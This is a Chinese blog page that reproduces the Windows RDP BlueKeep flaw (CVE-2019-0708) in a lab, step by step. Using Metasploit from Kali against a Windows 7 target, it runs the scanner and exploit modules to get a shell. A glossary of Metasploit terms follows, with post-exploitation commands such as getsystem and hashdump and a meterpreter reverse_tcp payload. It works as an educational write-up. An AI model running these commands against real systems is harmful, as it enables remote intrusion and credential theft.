
<!DOCTYPE html>
<html lang="en" class="loading">
<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>漏洞复现-windows远程桌面漏洞(CVE-2019-0708) - Hexo</title>
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="google" content="notranslate" />
    <meta name="keywords" content="Fechin,"> 
    <meta name="description" content="windows远程桌面漏洞(CVE-2019-0708)1.漏洞介绍2019年5月15号Windows发布补丁，该补丁修复了远程桌面中存在的远程代码执行漏洞CVE-2019-0708。
该漏洞可直接,"> 
    <meta name="author" content="John Doe"> 
    <link rel="alternative" href="atom.xml" title="Hexo" type="application/atom+xml"> 
    <link rel="icon" href="/img/favicon.png"> 
    
    
    
    <meta name="twitter:card" content="summary"/>
    <meta name="twitter:title" content="漏洞复现-windows远程桌面漏洞(CVE-2019-0708) - Hexo"/>
    <meta name="twitter:description" content="windows远程桌面漏洞(CVE-2019-0708)1.漏洞介绍2019年5月15号Windows发布补丁，该补丁修复了远程桌面中存在的远程代码执行漏洞CVE-2019-0708。
该漏洞可直接,"/>
    
    
    
    
    <meta property="og:site_name" content="Hexo"/>
    <meta property="og:type" content="object"/>
    <meta property="og:title" content="漏洞复现-windows远程桌面漏洞(CVE-2019-0708) - Hexo"/>
    <meta property="og:description" content="windows远程桌面漏洞(CVE-2019-0708)1.漏洞介绍2019年5月15号Windows发布补丁，该补丁修复了远程桌面中存在的远程代码执行漏洞CVE-2019-0708。
该漏洞可直接,"/>
    
<link rel="stylesheet" href="/css/diaspora.css">

<meta name="generator" content="Hexo 6.0.0"></head>

<body class="loading">
    <span id="config-title" style="display:none">Hexo</span>
    <div id="loader"></div>
    <div id="single">
    <div id="top" style="display: block;">
    <div class="bar" style="width: 0;"></div>
    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
    <div title="播放/暂停" class="iconfont icon-play"></div>
    <h3 class="subtitle">漏洞复现-windows远程桌面漏洞(CVE-2019-0708)</h3>
    <div class="social">
        <div>
            <div class="share">
                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
            </div>
            <div id="qr"></div>
        </div>
    </div>
    <div class="scrollbar"></div>
</div>

    <div class="section">
        <div class="article">
    <div class='main'>
        <h1 class="title">漏洞复现-windows远程桌面漏洞(CVE-2019-0708)</h1>
        <div class="stuff">
            <span>三月 11, 2022</span>
            

        </div>
        <div class="content markdown">
            <h1 id="windows远程桌面漏洞-CVE-2019-0708"><a href="#windows远程桌面漏洞-CVE-2019-0708" class="headerlink" title="windows远程桌面漏洞(CVE-2019-0708)"></a>windows远程桌面漏洞(CVE-2019-0708)</h1><h2 id="1-漏洞介绍"><a href="#1-漏洞介绍" class="headerlink" title="1.漏洞介绍"></a>1.漏洞介绍</h2><p>2019年5月15号Windows发布补丁，该补丁修复了远程桌面中存在的远程代码执行漏洞CVE-2019-0708。</p>
<p>该漏洞可直接通过rdp协议进行连接并发送恶意代码。一旦被利用会导致服务器入侵，可造成像WannaCry永恒之蓝、勒索病毒一样大规模的感染。</p>
<h2 id="2-参考链接"><a href="#2-参考链接" class="headerlink" title="2.参考链接"></a>2.参考链接</h2><p><a target="_blank" rel="noopener" href="https://ciaofox.me/2019/10/11/windows%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-0708%EF%BC%89/">https://ciaofox.me/2019/10/11/windows%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-0708%EF%BC%89/</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_39682037/article/details/105015873">https://blog.csdn.net/qq_39682037/article/details/105015873</a></p>
<p><a target="_blank" rel="noopener" href="https://www.jb51.net/article/169612.htm">https://www.jb51.net/article/169612.htm</a></p>
<h2 id="3-影响版本"><a href="#3-影响版本" class="headerlink" title="3.影响版本"></a>3.影响版本</h2><p>Windows 7  &#x2F;</p>
<p>Windows server 2008 R2  &#x2F; </p>
<p>Windows server 2008  &#x2F;</p>
<p>Windows 2003  &#x2F;</p>
<p>Windows xp  &#x2F;</p>
<h2 id="4-环境搭建"><a href="#4-环境搭建" class="headerlink" title="4.环境搭建"></a>4.环境搭建</h2><p>攻击机:kali 2021.1</p>
<p>靶机:win7 X64 旗舰版</p>
<h2 id="5-环境准备"><a href="#5-环境准备" class="headerlink" title="5.环境准备"></a>5.环境准备</h2><h4 id="5-1更新msf"><a href="#5-1更新msf" class="headerlink" title="5.1更新msf"></a>5.1更新msf</h4><p><code>apt-get update</code></p>
<h4 id="5-1-1如果无法更新则用vim文本编辑器打开sources-list更改更新源"><a href="#5-1-1如果无法更新则用vim文本编辑器打开sources-list更改更新源" class="headerlink" title="5.1.1如果无法更新则用vim文本编辑器打开sources.list更改更新源"></a>5.1.1如果无法更新则用vim文本编辑器打开sources.list更改更新源</h4><p><code>vim /etc/apt/sources.list</code></p>
<h4 id="5-1-2添加更新源"><a href="#5-1-2添加更新源" class="headerlink" title="5.1.2添加更新源"></a>5.1.2添加更新源</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>
<h4 id="5-1-3更新"><a href="#5-1-3更新" class="headerlink" title="5.1.3更新"></a>5.1.3更新</h4><p><code>apt-get update</code></p>
<h4 id="5-2更新一下kali中的msf模块"><a href="#5-2更新一下kali中的msf模块" class="headerlink" title="5.2更新一下kali中的msf模块"></a>5.2更新一下kali中的msf模块</h4><p><code>apt-get install metasploit-framework</code></p>
<h4 id="5-3下载漏洞的EXP（攻击套件）"><a href="#5-3下载漏洞的EXP（攻击套件）" class="headerlink" title="5.3下载漏洞的EXP（攻击套件）"></a>5.3下载漏洞的EXP（攻击套件）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/rapid7/metasploit-framework/edb7e20221e2088497d1f61132db3a56f81b8ce9/lib/msf/core/exploit/rdp.rb</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/rdp_scanner.rb</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/11/01/zIvON5y8igJK693.png" alt="20211101174241"></p>
<p>出现这个情况是因为msf的攻击套件已经内置了，不需要再下载</p>
<h4 id="5-4windows开启远程桌面服务"><a href="#5-4windows开启远程桌面服务" class="headerlink" title="5.4windows开启远程桌面服务"></a>5.4windows开启远程桌面服务</h4><p>控制面板-系统和安全-系统-远程设置<br><img src="https://i.loli.net/2021/11/01/UefsVCPXGY8ZQvT.png" alt="20211101190952"></p>
<h2 id="6-漏洞复现"><a href="#6-漏洞复现" class="headerlink" title="6.漏洞复现"></a>6.漏洞复现</h2><h4 id="6-1打开msf"><a href="#6-1打开msf" class="headerlink" title="6.1打开msf"></a>6.1打开msf</h4><p><code>msfconsole</code></p>
<p><img src="https://i.loli.net/2021/11/01/jotpPhKmdui8kJZ.png" alt="20211101192019"></p>
<p>中括号中是对msf中攻击工具的介绍</p>
<h4 id="6-2打开后加载EXP："><a href="#6-2打开后加载EXP：" class="headerlink" title="6.2打开后加载EXP："></a>6.2打开后加载EXP：</h4><p><code>reload_all</code><br><img src="https://i.loli.net/2021/11/01/x1vgYBPqZXRm9n3.png" alt="1635767748(1)"></p>
<p>这几个未被加载的模块跟本次漏洞没关系。并不影响</p>
<h4 id="6-3查找0708的攻击模块"><a href="#6-3查找0708的攻击模块" class="headerlink" title="6.3查找0708的攻击模块"></a>6.3查找0708的攻击模块</h4><p><code>search 0708</code><br><img src="https://i.loli.net/2021/11/01/2jughBb1GnT5Nt3.png" alt="20211101200704"></p>
<p>这里有四个模块，需要使用0号和3号，看关键字可发现，标号为0的模块是检查靶机是否存在0708漏洞的模块，标号为3的模块是利用0708漏洞的模块。</p>
<h4 id="6-4探测靶机是否存在这个漏洞。"><a href="#6-4探测靶机是否存在这个漏洞。" class="headerlink" title="6.4探测靶机是否存在这个漏洞。"></a>6.4探测靶机是否存在这个漏洞。</h4><p><code>use 0</code></p>
<p><img src="https://i.loli.net/2021/11/01/6fGQZ7y1qTVN9gH.png" alt="20211101200917"></p>
<h4 id="6-41配置靶机IP"><a href="#6-41配置靶机IP" class="headerlink" title="6.41配置靶机IP"></a>6.41配置靶机IP</h4><p><code>set rhosts 192.168.25.133</code></p>
<p><img src="https://i.loli.net/2021/11/01/rcBkzbjEghpM1JU.png" alt="20211101201934"></p>
<h4 id="6-42运行检测"><a href="#6-42运行检测" class="headerlink" title="6.42运行检测"></a>6.42运行检测</h4><p><code>run</code></p>
<p><img src="https://i.loli.net/2021/11/01/waRFO9meXobJLGi.png" alt="20211101201849"></p>
<p>返回结果：第1句说这个目标非常脆弱，这意味着对象存在着0708漏洞；第2句是已完成扫描任务；第3句是说模块执行完毕</p>
<h4 id="6-5用back指令返回"><a href="#6-5用back指令返回" class="headerlink" title="6.5用back指令返回"></a>6.5用back指令返回</h4><p><img src="https://i.loli.net/2021/11/01/BnVpsGd9rUvzCoN.png" alt="20211101201412"></p>
<h4 id="6-6选择3号模块开始使用这个漏洞对目标进行渗透。"><a href="#6-6选择3号模块开始使用这个漏洞对目标进行渗透。" class="headerlink" title="6.6选择3号模块开始使用这个漏洞对目标进行渗透。"></a>6.6选择3号模块开始使用这个漏洞对目标进行渗透。</h4><p><code>use 3</code></p>
<p><img src="https://i.loli.net/2021/11/01/xen3Q5WwD6Gh7sZ.png" alt="20211101202324"></p>
<p>没有配置payload，这里默认使用了windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</p>
<h4 id="6-61设置攻击目标ip"><a href="#6-61设置攻击目标ip" class="headerlink" title="6.61设置攻击目标ip"></a>6.61设置攻击目标ip</h4><p><code>set rhosts 192.168.25.133</code></p>
<p><img src="https://i.loli.net/2021/11/01/QxS6ioPRs7CmM9b.png" alt="20211101202409"></p>
<h4 id="6-7用show-targets查看"><a href="#6-7用show-targets查看" class="headerlink" title="6.7用show targets查看"></a>6.7用show targets查看</h4><p><code>show targets</code></p>
<p><img src="https://i.loli.net/2021/11/01/AKr5Mf6g91vcFZo.png" alt="20211101202845"></p>
<h4 id="6-71用show-options查看"><a href="#6-71用show-options查看" class="headerlink" title="6.71用show options查看"></a>6.71用show options查看</h4><p><code>show options</code></p>
<p><img src="https://i.loli.net/2021/11/01/vMDcSWRoQdVtgLA.png" alt="20211101205119"></p>
<p>这里就看到靶机的版本了</p>
<h4 id="6-8设置目标"><a href="#6-8设置目标" class="headerlink" title="6.8设置目标"></a>6.8设置目标</h4><p><code>set target 3</code></p>
<p>因为对照步骤6.7和6.71，可知版本id是序号3</p>
<p><img src="https://i.loli.net/2021/11/01/aPtz1wMKjFCvo4u.png" alt="20211101202632"></p>
<h4 id="6-9开始执行exp（渗透攻击）-获得shell"><a href="#6-9开始执行exp（渗透攻击）-获得shell" class="headerlink" title="6.9开始执行exp（渗透攻击）,获得shell"></a>6.9开始执行exp（渗透攻击）,获得shell</h4><p><code>exploit</code></p>
<p><img src="https://i.loli.net/2021/11/01/5eayPDmv9NFS6qw.png" alt="20211101205315"></p>
<p>exp后没有反应，可以更换target试试</p>
<h4 id="6-10更换target2尝试"><a href="#6-10更换target2尝试" class="headerlink" title="6.10更换target2尝试"></a>6.10更换target2尝试</h4><p><code>set target 2</code></p>
<p><code>exploit</code></p>
<p><img src="https://i.loli.net/2021/11/02/lOvTfiXnJsd2VrM.png" alt="1635835146(1)"></p>
<p>成功进去了</p>
<h4 id="6-11shell进去命令行"><a href="#6-11shell进去命令行" class="headerlink" title="6.11shell进去命令行"></a>6.11shell进去命令行</h4><p><code>shell</code></p>
<p><img src="https://i.loli.net/2021/11/02/bGdjZOe9EMYwavp.png" alt="20211102144138"></p>
<h4 id="6-12在命令行输入whoami验证"><a href="#6-12在命令行输入whoami验证" class="headerlink" title="6.12在命令行输入whoami验证"></a>6.12在命令行输入whoami验证</h4><p><code>whoami</code></p>
<p><img src="https://i.loli.net/2021/11/02/UEmAkguwP9Go4He.png" alt="20211102144256"></p>
<h4 id="6-13-打开靶机计算器验证"><a href="#6-13-打开靶机计算器验证" class="headerlink" title="6.13 打开靶机计算器验证"></a>6.13 打开靶机计算器验证</h4><p><code>calc</code></p>
<p><img src="https://i.loli.net/2021/11/02/vcSzWGpbVEqkUL2.png" alt="20211102144405"></p>
<p><img src="https://i.loli.net/2021/11/02/jTVWMoC4p7eRcE5.png" alt="20211102144428"></p>
<h2 id="7-知识点补充"><a href="#7-知识点补充" class="headerlink" title="7.知识点补充"></a>7.知识点补充</h2><h4 id="7-1msf"><a href="#7-1msf" class="headerlink" title="7.1msf"></a>7.1msf</h4><p>Metasploit就是一个漏洞框架。它的全称叫做The Metasploit Framework，简称MSF。是一个免费、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。它本身附带数2000多个已知软件漏洞的专业级漏洞攻击工具。当H.D. Moore在2003年发布MSF时，计算机安全状况也被永久性地改变了。仿佛一夜之间，任何人都可以成为黑客，每个人都可以使用攻击工具来攻击那些未打过补丁或者刚刚打过补丁的漏洞。软件厂商再也不能推迟发布针对已公布漏洞的补丁了，这是因为MSF团队一直都在努力开发各种攻击工具，并将它们贡献给所有MSF用户。MSF的设计初衷是打造成一个攻击工具开发平台，然而在目前情况下，安全专家以及业余安全爱好者更多地将其当作一种点几下鼠标就可以利用其中附带的攻击工具进行成功攻击的环境。</p>
<h4 id="7-2渗透攻击（Exploit）"><a href="#7-2渗透攻击（Exploit）" class="headerlink" title="7.2渗透攻击（Exploit）"></a>7.2渗透攻击（Exploit）</h4><p>渗透攻击是指由攻击者或者渗透测试者利用系统、应用或服务中的安全漏洞，所进行的攻击行为。</p>
<h4 id="7-3攻击载荷（Payload）"><a href="#7-3攻击载荷（Payload）" class="headerlink" title="7.3攻击载荷（Payload）"></a>7.3攻击载荷（Payload）</h4><p>攻击载何是我们期望目标系统在被渗透攻击后而执行的代码。在MSF框架中可以自由的选择、传送和植入。</p>
<p>反弹式shell是一种从目标主机到攻击主机创建网络连接，并提供命令行shell的攻击载荷。</p>
<p>bind shell攻击载荷则在目标主机上将命令行shell绑定到一个打开的监听端口，攻击者可以连接这些端口来取得shell交互。</p>
<h4 id="7-4溢出代码（Shellcode）"><a href="#7-4溢出代码（Shellcode）" class="headerlink" title="7.4溢出代码（Shellcode）"></a>7.4溢出代码（Shellcode）</h4><p>shellcode是在渗透攻击时作为攻击载荷运行的一组机器指令。shellcode通常用汇编语言编写。在大多数情况下，目标系统执行了shellcode这一组指令后，才会提供一个命令行shell或者Meterpreter shell，这也是shellcode名称的由来</p>
<h4 id="7-5模块（Module）"><a href="#7-5模块（Module）" class="headerlink" title="7.5模块（Module）"></a>7.5模块（Module）</h4><p>在MSF中，一个模块是指MSF框架中所使用的一段软件代码组件。在某些时候，你可能会使用一个渗透攻击模块（Exploit module），也就是用于实际发起渗透攻击的软件组件。而在其它时候，则可能使用一个辅助模块（auxiliary module），用来扫描一些诸如扫描或系统查点的攻击动作。</p>
<h4 id="7-6监听器（Listener）"><a href="#7-6监听器（Listener）" class="headerlink" title="7.6监听器（Listener）"></a>7.6监听器（Listener）</h4><p>监听器是MSF中用来等待连入网络连接的组件。举例来说，在目标主机被渗透攻击之后，它可能会通过互联网回连到攻击主机上，而监听器组件在攻击主机上等待被渗透攻击的系统来连接，并负责处理这些网络连接。</p>
<h4 id="7-7-MSF目录结构"><a href="#7-7-MSF目录结构" class="headerlink" title="7.7 MSF目录结构"></a>7.7 MSF目录结构</h4><h4 id="7-71-MSF-Kali下存放目录"><a href="#7-71-MSF-Kali下存放目录" class="headerlink" title="7.71 MSF Kali下存放目录"></a>7.71 MSF Kali下存放目录</h4><p>&#x2F;usr&#x2F;share&#x2F;MSF-framework&#x2F;</p>
<h4 id="7-72-Modules"><a href="#7-72-Modules" class="headerlink" title="7.72 Modules"></a>7.72 Modules</h4><p>用户用到的各种模块几乎都在这里，用户使用use这个msf这里时，就是用到了这个目录下的模块。这个目录下的文件在msfconsole启动时会被自动加载的，如果看到msfconsole启动时有出错信息但又能成功启动可以根据出错信息找解决方法，个人写的Module也可以放在这个目录下。</p>
<h4 id="7-73-Auxiliary"><a href="#7-73-Auxiliary" class="headerlink" title="7.73 Auxiliary"></a>7.73 Auxiliary</h4><p>主要包含渗透测试中一些辅助性的脚本，这些脚本功能有扫描，嗅探，破解，注入，漏洞挖掘等</p>
<p>Encoders：各种编码工具 用于躲过入侵检测和过滤系统。</p>
<h4 id="7-74-Exploits"><a href="#7-74-Exploits" class="headerlink" title="7.74 Exploits"></a>7.74 Exploits</h4><p>主要包含了传说中的exp、0day、各种漏洞利用的脚本。主要的攻击代码全在这，这里边包含的exp的路径的命名规则是 系统&#x2F;服务&#x2F;模块，在使用exp是可以根据这个命名方法来找（也可以用search这条指令来找）。比如：use exploites&#x2F;windows(系统)&#x2F;vnc(服务)&#x2F;realvnc_client(模块名)</p>
<h4 id="7-75-Nops"><a href="#7-75-Nops" class="headerlink" title="7.75 Nops"></a>7.75 Nops</h4><p>NOP (No Operation or Next Operation) sled,由于IDS&#x2F;IPS会检查数据包中不规则的数据，所以在某些场合下(比如针对溢出攻击),某些特殊的滑行字符串(NOPS x90x90…)则会因为被拦截而导致攻击失效，所以此时需要修改exploit中的NOPs.nops文件夹下的东西会在payload生成时用到。比如打开php的NOPS生成脚本，就会发现它只是返回了指定长度的空格而已。</p>
<h4 id="7-76-Payloads"><a href="#7-76-Payloads" class="headerlink" title="7.76 Payloads"></a>7.76 Payloads</h4><p>这个单词翻译过来叫载荷：是攻击者发送给系统执行的指令（不包含exploits攻击阶段），payloads主要是在目标机执行的，而exploits是在本地机执行作用于目标机。命名规则是： 系统&#x2F;类型&#x2F;名称 比如: use payloads&#x2F;windows&#x2F;shell&#x2F;bind_tcp</p>
<h4 id="7-77-Post"><a href="#7-77-Post" class="headerlink" title="7.77 Post"></a>7.77 Post</h4><p>这个目录里放着msf 的exploits执行成功后，向目标机发送的一些功能性指令比如：提权，获取hash等。</p>
<h4 id="7-78-Data"><a href="#7-78-Data" class="headerlink" title="7.78 Data"></a>7.78 Data</h4><p>这个目录里盛放了Meterpreter、PassiveX、Vnc、DLLs等这些工具和一些用户接口代码，Msfweb 和一些其他模块用到的数据文件。</p>
<p>Data下js文件夹下的Detect，这里面存放的是MSF的探针文件。如果看过MSF浏览器攻击脚本的代码，就会发现调用了一个js库，然后检查当前请求是否符合被攻击环境。如果符合则发送攻击代码，否则中断。Memory中主要是一些堆喷射代码。在大部分浏览器漏洞利用过程，堆喷射是一个不可或缺的过程(当然不是绝对的！)。并且不同的浏览器及版本间，堆喷射代码都有所不同。所以这里给出的探针代码和堆喷射代码是不是一个非常好的学习资源呢。</p>
<h4 id="7-79-Plugins"><a href="#7-79-Plugins" class="headerlink" title="7.79 Plugins"></a>7.79 Plugins</h4><p>这里的模块用户需要使用load 来加载，提供数据库连接插件，和各种要用到的插件</p>
<h4 id="7-710-Scripts"><a href="#7-710-Scripts" class="headerlink" title="7.710 Scripts"></a>7.710 Scripts</h4><p>这个目录下的文件大都是Meterpreter这个模块利用的脚本。比如Meterpreter里用到的migrate来转移到其他进程的指令的源代码就在这个目录下。这里的rc脚本相当于Windows下的批处理脚本，在某些情况下会有一定便捷性。比如Veil在生成免杀payload的同时也会生成一个rc脚本，此时使用msfconsole –r xx.rc便可以快速的建立一个和payload对应的handler，亦或在攻过程中需要你反复的set exploit,那么就可以使用这个批处理脚本了，而这个目录下则是一些给定的rc脚本，虽然你可能不习惯这样使用，但作为改写自己的rc脚本的资源也不错。</p>
<h4 id="7-711-Tools"><a href="#7-711-Tools" class="headerlink" title="7.711 Tools"></a>7.711 Tools</h4><p>包含一些有用的脚本和零散的工具。</p>
<h4 id="7-8-msf常用命令"><a href="#7-8-msf常用命令" class="headerlink" title="7.8 msf常用命令"></a>7.8 msf常用命令</h4><h4 id="7-81帮助菜单-查看MSF支持哪些命令"><a href="#7-81帮助菜单-查看MSF支持哪些命令" class="headerlink" title="7.81帮助菜单,查看MSF支持哪些命令"></a>7.81帮助菜单,查看MSF支持哪些命令</h4><p><code>?</code></p>
<h4 id="7-82查看该命令使用方法"><a href="#7-82查看该命令使用方法" class="headerlink" title="7.82查看该命令使用方法"></a>7.82查看该命令使用方法</h4><p><code>？+命令</code></p>
<h4 id="7-83查找该漏洞攻击模块"><a href="#7-83查找该漏洞攻击模块" class="headerlink" title="7.83查找该漏洞攻击模块"></a>7.83查找该漏洞攻击模块</h4><p><code>search 漏洞编号</code><br>如search CVE-2017-0143</p>
<h4 id="7-84选择利用工具"><a href="#7-84选择利用工具" class="headerlink" title="7.84选择利用工具"></a>7.84选择利用工具</h4><p><code>use 序号</code><br>如use 2</p>
<h4 id="7-85查看配置项"><a href="#7-85查看配置项" class="headerlink" title="7.85查看配置项"></a>7.85查看配置项</h4><p><code>show option</code></p>
<h4 id="7-86配置目标IP"><a href="#7-86配置目标IP" class="headerlink" title="7.86配置目标IP"></a>7.86配置目标IP</h4><p><code>set rhosts IP</code><br>如set rhosts 192.168.60.174</p>
<h4 id="7-87设置木马"><a href="#7-87设置木马" class="headerlink" title="7.87设置木马"></a>7.87设置木马</h4><p><code>show payloads</code></p>
<h4 id="7-88查看有哪些木马"><a href="#7-88查看有哪些木马" class="headerlink" title="7.88查看有哪些木马"></a>7.88查看有哪些木马</h4><p><code>set payload windows/x64/meterpreter/reverse_tcp</code></p>
<h4 id="7-89MSF后继攻击"><a href="#7-89MSF后继攻击" class="headerlink" title="7.89MSF后继攻击"></a>7.89MSF后继攻击</h4><p>输入shell进入目标cmd下</p>
<p>输入getsystem获取管理员权限</p>
<p>输入exit退出cmd</p>
<h4 id="7-810查看目标主机用户密码"><a href="#7-810查看目标主机用户密码" class="headerlink" title="7.810查看目标主机用户密码"></a>7.810查看目标主机用户密码</h4><p><code>hashdump</code></p>

            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
                <source type="audio/mpeg" src="">
            </audio>
            
                <ul id="audio-list" style="display:none">
                    
                        
                            <li title="0" data-url="http://link.hhtjim.com/163/425570952.mp3"></li>
                        
                    
                        
                            <li title="1" data-url="http://link.hhtjim.com/163/425570952.mp3"></li>
                        
                    
                </ul>
            
        </div>
        
    <div id="gitalk-container" class="comment link"
		data-enable="false"
        data-ae="false"
        data-ci=""
        data-cs=""
        data-r=""
        data-o=""
        data-a=""
        data-d="false"
    >查看评论</div>


    </div>
    
</div>


    </div>
</div>
</body>


<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
<script src="/js/plugin.js"></script>
<script src="/js/typed.js"></script>
<script src="/js/diaspora.js"></script>


<link rel="stylesheet" href="/photoswipe/photoswipe.css">
<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">


<script src="/photoswipe/photoswipe.min.js"></script>
<script src="/photoswipe/photoswipe-ui-default.min.js"></script>


<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>
    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">
        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>
        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">
            <div class="pswp__top-bar">
                <!--  Controls are self-explanatory. Order can be changed. -->
                <div class="pswp__counter"></div>
                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                <button class="pswp__button pswp__button--share" title="Share"></button>
                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                      <div class="pswp__preloader__cut">
                        <div class="pswp__preloader__donut"></div>
                      </div>
                    </div>
                </div>
            </div>
            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div> 
            </div>
            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>
            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>
            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>
        </div>
    </div>
</div>






</html>
